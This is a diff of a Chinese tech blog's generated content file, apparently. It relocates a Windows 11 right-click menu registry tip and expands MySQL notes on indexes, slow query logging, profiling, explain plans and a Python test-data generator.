+<h2 id="Win11右键默认显示更多选项的方法"><a href="#Win11右键默认显示更多选项的方法" class="headerlink" title="Win11右键默认显示更多选项的方法"></a>Win11右键默认显示更多选项的方法</h2><p>1、点击开始菜单 -&gt; 打开Windows PowerShell (管理员身份运行)<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image2.png"><br>2、在Windows PowerShell里输入<code>reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</code> ，敲Enter执行<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image3.png"><br>3、重启win11，发现修改生效<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image4.png"></p>
+]]></content>
+      <categories>
+        <category>Win</category>
+      </categories>
+      <tags>
+        <tag>Win</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何修复Rocky Linux 9 OpenSSH CVE-2024-6387漏洞</title>
     <url>/2024/07/10/2024-07-10-how-to-fix-openssh-cve-2024-6387-in-rockylinux9/</url>
     <content><![CDATA[<p>关于漏洞的详细说明，参考Rocky官方文档：<a href="https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression">https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression</a></p>
@@ -6174,21 +6189,6 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Win11右键默认显示更多选项的方法</title>
-    <url>/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/</url>
-    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>win11系统默认右键菜单显示选项太少，每次需要点一下“显示更多选项”才能得到想要内容。比方说我用notepad++打开一个文档，在win11上要先点一下”显示更多选项“，再选择用notepad++打开，操作非常反人类。</p>
-<span id="more"></span>
-<p><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image1.png"></p>
-<h2 id="Win11右键默认显示更多选项的方法"><a href="#Win11右键默认显示更多选项的方法" class="headerlink" title="Win11右键默认显示更多选项的方法"></a>Win11右键默认显示更多选项的方法</h2><p>1、点击开始菜单 -&gt; 打开Windows PowerShell (管理员身份运行)<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image2.png"><br>2、在Windows PowerShell里输入<code>reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</code> ，敲Enter执行<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image3.png"><br>3、重启win11，发现修改生效<br><img data-src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image4.png"></p>
-]]></content>
-      <categories>
-        <category>Win</category>
-      </categories>
-      <tags>
-        <tag>Win</tag>
       </tags>
   </entry>
   <entry>
@@ -8262,13 +8262,13 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
     <title>MySQL进阶</title>
     <url>/2024/10/16/2024-10-16-mysql-advance/</url>
     <content><![CDATA[<h2 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h2><p>连接层 -&gt; 服务层 -&gt; 引擎层 —&gt; 存储层</p>
-<h2 id="存储引擎简介"><a href="#存储引擎简介" class="headerlink" title="存储引擎简介"></a>存储引擎简介</h2><p>存储引擎指存储数据，建立索引，更新&#x2F;查询数据等技术的实现方式。存储引擎是基于表的，不是基于库的。</p>
+<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>存储引擎指存储数据，建立索引，更新&#x2F;查询数据等技术的实现方式。<br>存储引擎是基于表的，不是基于库的。</p>
 <h3 id="查某个表的存储引擎"><a href="#查某个表的存储引擎" class="headerlink" title="查某个表的存储引擎"></a>查某个表的存储引擎</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure>
 <h3 id="查数据库支持的存储引擎"><a href="#查数据库支持的存储引擎" class="headerlink" title="查数据库支持的存储引擎"></a>查数据库支持的存储引擎</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure>
 
 <h3 id="创建表时指定引擎"><a href="#创建表时指定引擎" class="headerlink" title="创建表时指定引擎"></a>创建表时指定引擎</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table a(</span><br><span class="line">)engine = MyISAM;</span><br><span class="line"></span><br><span class="line">create table b(</span><br><span class="line">)engine = InnoDB;</span><br></pre></td></tr></table></figure>
 
-<h2 id="存储引擎特点"><a href="#存储引擎特点" class="headerlink" title="存储引擎特点"></a>存储引擎特点</h2><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><ul>
+<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><ul>
 <li>支持事务，行级锁，外键</li>
 <li>每张表对应一个表空间文件XXX.ibd，路径:<code>/var/lib/mysql/*.ibd</code></li>
 <li>逻辑存储结构: TableSpace(表空间), Segment(段), Extent(区), Page(页), Row(行)</li>
@@ -8313,48 +8313,197 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 <h3 id="为什么InnoDB选择B-树，不用二叉树，B树"><a href="#为什么InnoDB选择B-树，不用二叉树，B树" class="headerlink" title="为什么InnoDB选择B+树，不用二叉树，B树"></a>为什么InnoDB选择B+树，不用二叉树，B树</h3><ul>
 <li>二叉树：顺序插入时，退化成链表，查询性能低；层级较深，查询速度慢。</li>
 <li>B-Tree: 叶子节点和非叶子节点都保存数据，查询不稳定；相比B+树IO消耗大</li>
-<li>B+Tree: 只有叶子节点存储数据，一个节点可以存储更多的key，使得树更矮，减少IO操作次数；所有叶子节点构成一个有序链表<br>MySQL在原B+Tree基础上，增加一个指向相邻叶子节点的链表指针，提高区间访问性能。</li>
+<li>B+Tree: 只有叶子节点存储数据，使得树更矮，减少IO操作次数；所有叶子节点构成一个有序链表<br>MySQL在原B+Tree基础上，增加一个指向相邻叶子节点的链表指针，提高区间访问性能。</li>
 </ul>
-<p><a href="https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&vd_source=d8559c2d87607be86810cd806158bb86&p=72">https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&amp;vd_source=d8559c2d87607be86810cd806158bb86&amp;p=72</a></p>
-<span id="more"></span>
-
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>创建索引</p>
+<h3 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h3><table>
+<thead>
+<tr>
+<th>分类</th>
+<th>含义</th>
+<th>特点</th>
+<th>关键字</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键索引</td>
+<td>针对于表中主键创建的索引</td>
+<td>默认自动创建，只有一个</td>
+<td>PRIMARY</td>
+</tr>
+<tr>
+<td>唯一索引</td>
+<td>避免同一个表中某数据列的重复</td>
+<td>可以有多个</td>
+<td>UNIQUE</td>
+</tr>
+<tr>
+<td>常规索引</td>
+<td>快速定位特定数据</td>
+<td>可以有多个</td>
+<td></td>
+</tr>
+<tr>
+<td>全文索引</td>
+<td>查找文本中关键词</td>
+<td>可以有多个</td>
+<td>FULLTEXT</td>
+</tr>
+</tbody></table>
+<p>在InnoDB中，根据索引的存储形式，又可以分如下两种：</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>含义</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>聚集索引(Clustered Index)</td>
+<td>将数据和索引一起存储，叶子节点保存了行数据</td>
+<td>有且只有一个</td>
+</tr>
+<tr>
+<td>二级索引(Secondary Index)</td>
+<td>将数据和索引分开存储，叶子节点关联对应主键</td>
+<td>可存在多个</td>
+</tr>
+</tbody></table>
+<p>聚集索引选取规则：</p>
+<ul>
+<li>如果存在主键，主键索引就是聚集索引</li>
+<li>如果不存在主键，使用第一个唯一索引作为聚集索引</li>
+<li>如没有主键和合适的唯一索引，InnoDB会自动生成一个rowid作为隐藏的聚集索引</li>
+</ul>
+<h3 id="索引语法"><a href="#索引语法" class="headerlink" title="索引语法"></a>索引语法</h3><p>创建索引</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create [unique|fulltext] index index_name on table_name (index_col_name,...);</span><br></pre></td></tr></table></figure>
 <p>查看索引</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show index from table_name;</span><br></pre></td></tr></table></figure>
 <p>删除索引</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop index index_name on table_name;</span><br></pre></td></tr></table></figure>
 
-<p>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user;</span><br><span class="line">|id | name | email | profession | age | gender | status | createtime |</span><br><span class="line">create table tb_user(</span><br><span class="line">	id bigint auto_increment primary key,</span><br><span class="line">	name varchar(10),</span><br><span class="line">	email varchar(36),</span><br><span class="line">	profession varchar(36),</span><br><span class="line">	age tinyint unsigned,</span><br><span class="line">	gender char(1),</span><br><span class="line">	status int,</span><br><span class="line">	createtime datetime</span><br><span class="line">)engine=InnoDB;</span><br></pre></td></tr></table></figure>
+<p>例：按如下要求完成索引的创建</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user(</span><br><span class="line">	id <span class="type">bigint</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">	name <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">	phone <span class="type">char</span>(<span class="number">11</span>),</span><br><span class="line">	email <span class="type">varchar</span>(<span class="number">36</span>),</span><br><span class="line">	profession <span class="type">varchar</span>(<span class="number">36</span>),</span><br><span class="line">	age tinyint unsigned,</span><br><span class="line">	gender <span class="type">char</span>(<span class="number">1</span>),</span><br><span class="line">	status <span class="type">int</span>,</span><br><span class="line">	createtime datetime</span><br><span class="line">)engine<span class="operator">=</span>InnoDB;</span><br></pre></td></tr></table></figure>
 
-<p>name设置索引<br>phone非空创建唯一索引<br>profession,age,status设置联合索引<br>email建立索引</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create index idx_user_name on tb_user(name);</span><br><span class="line">create unique index idx_user_phone on tb_user(phone);</span><br><span class="line">create index idx_user_pro_age_sta on tb_user(profession,age,status);</span><br><span class="line">create index idx_user_email on tb_user(email);</span><br></pre></td></tr></table></figure>
-
-<h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>SQL执行效率<br>show [session|global] status;查看数据库insert,update,delete,select频次</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global status like &#x27;com_______&#x27;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Com_binlog    | 0     |</span><br><span class="line">| Com_commit    | 1     |</span><br><span class="line">| Com_delete    | 2     |</span><br><span class="line">| Com_import    | 0     |</span><br><span class="line">| Com_insert    | 30    |</span><br><span class="line">| Com_repair    | 0     |</span><br><span class="line">| Com_revoke    | 0     |</span><br><span class="line">| Com_select    | 231   |</span><br><span class="line">| Com_signal    | 0     |</span><br><span class="line">| Com_update    | 9     |</span><br><span class="line">| Com_xa_end    | 0     |</span><br><span class="line">+---------------+-------+</span><br></pre></td></tr></table></figure>
-
-<p>慢查询日志<br>记录所有执行时间超过指定参数long_query_time(默认:10秒)的SQL语句日志<br>默认没开</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;slow_query%&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log      | OFF                               |</span><br><span class="line">| slow_query_log_file | /var/lib/mysql/localhost-slow.log |</span><br><span class="line">+---------------------+-----------------------------------+</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h3><h4 id="为什么需要索引"><a href="#为什么需要索引" class="headerlink" title="为什么需要索引"></a>为什么需要索引</h4><p>关系数据库中可能存在上万甚至上亿条记录，想要获得非常快的查询速度，就需要使用索引。</p>
-<h4 id="什么是索引"><a href="#什么是索引" class="headerlink" title="什么是索引"></a>什么是索引</h4><p>索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。<br>通过索引，数据库系统不必扫描整个表，而是直接定位到符合条件的记录，这样就大大加快了查询速度。</p>
-<h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> index <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
-
-<h4 id="添加索引"><a href="#添加索引" class="headerlink" title="添加索引"></a>添加索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student (id <span class="type">bigint</span> <span class="keyword">primary</span> key <span class="keyword">not</span> <span class="keyword">null</span> auto_increment, class_id <span class="type">int</span>, name <span class="type">varchar</span>(<span class="number">32</span>), gender <span class="type">int</span>, score <span class="type">int</span>);</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student <span class="keyword">add</span> index idx_score (score);</span><br></pre></td></tr></table></figure>
+<p>要求：</p>
 <ul>
-<li>索引的效率取决于索引列的值是否散列，即该列的值如果越互不相同，那么索引效率越高。</li>
-<li>可以对一张表创建多个索引。索引的优点是提高了查询效率，缺点是在插入、更新和删除记录时，需要同时修改索引</li>
-<li>对于主键，关系数据库会自动对其创建主键索引。使用主键索引的效率是最高的，因为主键会保证绝对唯一。</li>
+<li>name设置索引</li>
+<li>phone非空创建唯一索引</li>
+<li>profession,age,status设置联合索引</li>
+<li>email建立索引</li>
 </ul>
-<h4 id="唯一索引"><a href="#唯一索引" class="headerlink" title="唯一索引"></a>唯一索引</h4><p>添加唯一索引</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> INDEX uni_name (name);</span><br></pre></td></tr></table></figure>
-<p>只对某一列添加一个唯一约束而不创建唯一索引：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uni_name <span class="keyword">UNIQUE</span> (name);</span><br></pre></td></tr></table></figure>
-<p>删除索引</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> mytable <span class="keyword">drop</span> index uni_name;</span><br></pre></td></tr></table></figure>
+<p>创建索引</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_user_name <span class="keyword">on</span> tb_user(name);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index idx_user_phone <span class="keyword">on</span> tb_user(phone);</span><br><span class="line"><span class="keyword">create</span> index idx_user_pro_age_sta <span class="keyword">on</span> tb_user(profession,age,status);</span><br><span class="line"><span class="keyword">create</span> index idx_user_email <span class="keyword">on</span> tb_user(email);</span><br></pre></td></tr></table></figure>
+<p>查看索引</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show index from tb_user;</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br><span class="line">| Table   | Non_unique | Key_name             | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | Visible | Expression |</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br><span class="line">| tb_user |          0 | PRIMARY              |            1 | id          | A         |           0 |     NULL |   NULL |      | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          0 | idx_user_phone       |            1 | phone       | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_name        |            1 | name        | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            1 | profession  | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            2 | age         | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_pro_age_sta |            3 | status      | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">| tb_user |          1 | idx_user_email       |            1 | email       | A         |           0 |     NULL |   NULL | YES  | BTREE      |         |               | YES     | NULL       |</span><br><span class="line">+---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL性能分析"><a href="#SQL性能分析" class="headerlink" title="SQL性能分析"></a>SQL性能分析</h2><h3 id="查询SQL执行频率"><a href="#查询SQL执行频率" class="headerlink" title="查询SQL执行频率"></a>查询SQL执行频率</h3><p>通过如下命令，查看SQL中增删改查的频率</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global status like &#x27;Com_______&#x27;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Com_binlog    | 0     |</span><br><span class="line">| Com_commit    | 0     |</span><br><span class="line">| Com_delete    | 0     |</span><br><span class="line">| Com_import    | 0     |</span><br><span class="line">| Com_insert    | 0     |</span><br><span class="line">| Com_repair    | 0     |</span><br><span class="line">| Com_revoke    | 0     |</span><br><span class="line">| Com_select    | 4     |</span><br><span class="line">| Com_signal    | 0     |</span><br><span class="line">| Com_update    | 0     |</span><br><span class="line">| Com_xa_end    | 0     |</span><br><span class="line">+---------------+-------+</span><br></pre></td></tr></table></figure>
+<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>记录所有执行时间超过指定参数long_query_time(默认:10秒)的所有SQL语句日志</p>
+<p>MySQL的慢查询日志默认没有开，需要手动配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;slow_query%&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log      | OFF                               |</span><br><span class="line">| slow_query_log_file | /var/lib/mysql/localhost-slow.log |</span><br><span class="line">+---------------------+-----------------------------------+</span><br></pre></td></tr></table></figure>
+<p>修改<code>/etc/my.cnf.d/mysql-server.cnf</code>, 在[mysqld]最后添加两行，开启MySQL慢查询日志，设置慢查询超时时间2秒</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">slow-query-log=on</span><br><span class="line">long_query_time=2</span><br></pre></td></tr></table></figure>
+<p>重启mysqld, 执行<code>systemctl restart mysqld</code>，再确认修改后的配置已生效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;slow_query%&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log      | ON                                |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">mysql&gt; show variables like &#x27;long_query_time&#x27;;</span><br><span class="line">+-----------------+----------+</span><br><span class="line">| Variable_name   | Value    |</span><br><span class="line">+-----------------+----------+</span><br><span class="line">| long_query_time | 2.000000 |</span><br><span class="line">+-----------------+----------+</span><br></pre></td></tr></table></figure>
+<h3 id="profile详情"><a href="#profile详情" class="headerlink" title="profile详情"></a>profile详情</h3><p>先打开profile开关</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@profiling;</span><br><span class="line">+-------------+</span><br><span class="line">| @@profiling |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set profiling = 1;</span><br></pre></td></tr></table></figure>
+<p>执行SQL操作后，通过show profiles查看指令的执行耗时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show profiles;</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                        |</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">|        1 | 0.00027175 | select * from tb_user        |</span><br><span class="line">|        2 | 0.00008450 | show profiles for query 1    |</span><br><span class="line">+----------+------------+------------------------------+</span><br><span class="line">mysql&gt; show profile for query 1;</span><br><span class="line">mysql&gt; show profile cpu for query 1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="explain"><a href="#explain" class="headerlink" title="explain"></a>explain</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">explain select * from tb_user where id = 1;</span><br></pre></td></tr></table></figure>
+
+<p>实例：给tb_user表生成100w条数据，用于测试查询性能</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import random</span><br><span class="line">from datetime import datetime, timedelta</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">#insert into tb_user(name,phone,email,profession,age,gender,status,createtime) values(&#x27;Jony&#x27;,&#x27;12345678111&#x27;, &#x27;example@163.com&#x27;, &#x27;RD&#x27;,18,&#x27;M&#x27;,1,NOW());</span><br><span class="line"></span><br><span class="line">def generate_phone():</span><br><span class="line">    return &#x27;1&#x27; + &#x27;&#x27;.join([str(random.randint(0, 9)) for _ in range(10)])</span><br><span class="line"></span><br><span class="line">def generate_random_date():</span><br><span class="line">    start_date = datetime(2024, 1, 1)</span><br><span class="line">    end_date = datetime(2024, 12, 31)</span><br><span class="line">    time_between_dates = end_date - start_date</span><br><span class="line">    days_between_dates = time_between_dates.days</span><br><span class="line">    random_number_of_days = random.randint(0, days_between_dates)</span><br><span class="line">    random_date = start_date + timedelta(days=random_number_of_days)</span><br><span class="line">    return random_date.strftime(&#x27;%Y-%m-%d&#x27;)</span><br><span class="line"></span><br><span class="line">def generate_random_name(length=5):</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(letters) for _ in range(length))</span><br><span class="line"></span><br><span class="line">def insert_data():</span><br><span class="line">    with open(&#x27;./test.sql&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">        for i in range(1000000):</span><br><span class="line">            name = generate_random_name()</span><br><span class="line">            phone = generate_phone()</span><br><span class="line">            email = generate_random_name() + &#x27;@163.com&#x27;</span><br><span class="line">            profession = random.choice([&#x27;Sales&#x27;, &#x27;R&amp;D&#x27;, &#x27;Marketing&#x27;, &#x27;OPS&#x27;])</span><br><span class="line">            age = random.randint(0,130)</span><br><span class="line">            gender = random.choice([&#x27;F&#x27;,&#x27;M&#x27;])</span><br><span class="line">            status = random.choice([0, 1])</span><br><span class="line">            date = generate_random_date()</span><br><span class="line">            output = &quot;insert into tb_user(name,phone,email,profession,age,gender,status,createtime) values(&#x27;&#123;name&#125;&#x27;,&#x27;&#123;phone&#125;&#x27;, &#x27;&#123;email&#125;&#x27;, &#x27;&#123;profession&#125;&#x27;,&#123;age&#125;,&#x27;&#123;gender&#125;&#x27;, &#123;status&#125;, &#x27;&#123;date&#125;&#x27;);&quot;.format(name=name, phone=phone, email=email, profession=profession, age=age, gender=gender, status=status, date=date)</span><br><span class="line">            f.write(output + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">insert_data()</span><br></pre></td></tr></table></figure>
+<p>再从SQL文件中批量导入tb_user表的数据到数据库pc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -D pc &lt; test.sql </span><br></pre></td></tr></table></figure>
+
+<p>explain执行计划中各字段含义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where id = 1;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>id<br>表示查询中执行select子句或操作表的顺序，id相同执行顺序从上到下，id不同，值越大越先执行</li>
+<li>select_type<br>表示select类型，常见取值有simple, primary, union, subquery(有子查询)</li>
+<li>type<br>表示连接类型，性能由好到差为NULL, system, const, eq_ref, ref, range, index, all</li>
+<li>possible_keys<br>显示可能应用在这张表的索引，一个或多个</li>
+<li>key<br>表示实际用到的索引，如果为NULL说明没使用索引</li>
+<li>key_len<br>表示索引中字节数，该值为索引字段最大可能长度，并非实际使用长度，长度越短越好</li>
+<li>rows<br>MySQL认为必须要执行查询的行数，在InnoDB表中，是一个估计值，可能并不总是准确的</li>
+<li>filtered<br>表示返回结果的行数占需读取行数百分比，filtered值越大越好</li>
+</ul>
+<p>例: explain type &#x3D; NULL (没有查表)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select &#x27;A&#x27;;</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra          |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | NULL  | NULL       | NULL | NULL          | NULL | NULL    | NULL | NULL |     NULL | No tables used |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br></pre></td></tr></table></figure>
+<p>例: explain type &#x3D; const (走主键索引&#x2F;唯一索引)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where id = 1;</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">| id | select_type | table   | partitions | type  | possible_keys | key     | key_len | ref   | rows | filtered | Extra |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | const | PRIMARY       | PRIMARY | 8       | const |    1 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+---------+------------+-------+---------------+---------+---------+-------+------+----------+-------+</span><br></pre></td></tr></table></figure>
+<p>例: explain type &#x3D; ref (走普通的非唯一索引)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select name from tb_user where name = &#x27;uXrBh&#x27;;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br><span class="line">| id | select_type | table   | partitions | type | possible_keys | key           | key_len | ref   | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br><span class="line">|  1 | SIMPLE      | tb_user | NULL       | ref  | idx_user_name | idx_user_name | 43      | const |    1 |   100.00 | Using index |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+---------------+---------+-------+------+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h2 id="索引应用"><a href="#索引应用" class="headerlink" title="索引应用"></a>索引应用</h2><h3 id="最左前缀法则"><a href="#最左前缀法则" class="headerlink" title="最左前缀法则"></a>最左前缀法则</h3><ul>
+<li>对于索引了多列的场景，最左前缀法则指查询从索引的最左列开始，且不跳过索引中的列</li>
+<li>如果跳跃某一列，索引将部分失效(后面字段索引失效)</li>
+</ul>
+<p>例：先查看tb_user表的索引</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> index <span class="keyword">from</span> tb_user;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+------------+----------------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>   <span class="operator">|</span> Non_unique <span class="operator">|</span> Key_name             <span class="operator">|</span> Seq_in_index <span class="operator">|</span> Column_name <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> <span class="keyword">Cardinality</span> <span class="operator">|</span> Sub_part <span class="operator">|</span> Packed <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Index_type <span class="operator">|</span> Comment <span class="operator">|</span> Index_comment <span class="operator">|</span> Visible <span class="operator">|</span> Expression <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span 